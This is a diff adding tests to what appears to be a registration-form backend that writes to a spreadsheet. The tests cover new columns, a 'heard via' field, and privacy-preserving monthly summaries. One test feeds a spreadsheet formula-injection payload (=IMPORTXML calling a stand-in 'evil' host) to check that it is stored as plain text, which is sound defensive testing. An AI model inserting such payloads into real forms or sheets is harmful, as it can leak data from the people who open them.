@@ -149,16 +149,16 @@ test('stores the origin tags and interests in the new columns', () => {
   const g = gas()
   g.post(base({ source: 'interview', entry: 'washimap', interests: 'videos,map' }))
   const [header, row] = g.rows()
-  assert.deepEqual([...header.slice(11)], ['Source', 'Entry point', 'Interests'])
-  assert.deepEqual([...row.slice(11)], ['interview', 'washimap', 'videos,map'])
+  assert.deepEqual([...header.slice(11, 14)], ['Source', 'Entry point', 'Interests'])
+  assert.deepEqual([...row.slice(11, 14)], ['interview', 'washimap', 'videos,map'])
 })
 
 test('missing or malformed tags fall back to direct / link / no interests', () => {
   const g = gas()
   g.post(base())
   g.post(base({ email: 'b@example.org', source: 'Bad Value!', entry: '=1+1', interests: 'a@b.c' }))
-  assert.deepEqual([...g.rows()[1].slice(11)], ['direct', 'link', ''])
-  assert.deepEqual([...g.rows()[2].slice(11)], ['direct', 'link', ''])
+  assert.deepEqual([...g.rows()[1].slice(11, 14)], ['direct', 'link', ''])
+  assert.deepEqual([...g.rows()[2].slice(11, 14)], ['direct', 'link', ''])
 })
 
 test('no link to the trial site or a mockup, in any email or response', () => {
@@ -184,7 +184,7 @@ test('an older sheet gets the new column headings', () => {
   g.seed([old, [1, '2026-10-06T00:00:00.000Z', 'Old Person', 'old@example.org', 'GB',
     'United Kingdom', 'Museum / Gallery', 'en', 'N', 'waitlist-notice-2026-10-05', 'sent']])
   g.post(base())
-  assert.deepEqual([...g.rows()[0].slice(11)], ['Source', 'Entry point', 'Interests'])
+  assert.deepEqual([...g.rows()[0].slice(11, 14)], ['Source', 'Entry point', 'Interests'])
   assert.equal(g.rows()[2][0], 2) // numbering continues from the counter
 })
 
@@ -215,4 +215,38 @@ test('monthly summary writes counts only, never names or addresses', () => {
 test('monthly summary refuses to run without a target file', () => {
   const g = gas()
   assert.throws(() => g.run('monthlySummary'), /SUMMARY_SPREADSHEET_ID/)
+})
+
+test('stores "how did you know" answers and the optional other text', () => {
+  const g = gas()
+  g.post(base({ heard: 'linkedin,other', heardOther: 'A poster at ICON 2026' }))
+  const [header, row] = g.rows()
+  assert.deepEqual([...header.slice(14)], ['Heard via', 'Heard via (other)'])
+  assert.deepEqual([...row.slice(14)], ['linkedin,other', 'A poster at ICON 2026'])
+})
+
+test('other text is stored as plain text and malformed codes are dropped', () => {
+  const g = gas()
+  g.post(base({ heard: 'Bad!', heardOther: '=IMPORTXML("http://evil","//a")' }))
+  assert.equal(g.appended.at(-1)[14], '')
+  assert.equal(g.appended.at(-1)[15], `'=IMPORTXML("http://evil","//a")`)
+  g.post(base({ email: 'b@example.org', heardOther: 'x'.repeat(101) }))
+  assert.equal(g.rows()[2][15], '')
+})
+
+test('monthly summary counts "heard via" codes but never copies the free text', () => {
+  const g = gas({ props: { SUMMARY_SPREADSHEET_ID: 'sum2' } })
+  g.post(base({ heard: 'team,linkedin' }))
+  g.post(base({ email: 'b@example.org', heard: 'other', heardOther: 'Secret Museum newsletter' }))
+  g.run('monthlySummary')
+  const month = new Date(Date.now() + 9 * 3600 * 1000).toISOString().slice(0, 7)
+  const t = g.summary('sum2', 'By heard via')
+  assert.deepEqual(JSON.parse(JSON.stringify(t)), [
+    ['Month', 'Heard via', 'Registrations'],
+    [month, 'linkedin', 1],
+    [month, 'other', 1],
+    [month, 'team', 1],
+  ])
+  const all = JSON.stringify(['Totals', 'By source & entry', 'By interest', 'By heard via'].map((n) => g.summary('sum2', n)))
+  assert.ok(!all.includes('Secret Museum'))
 })
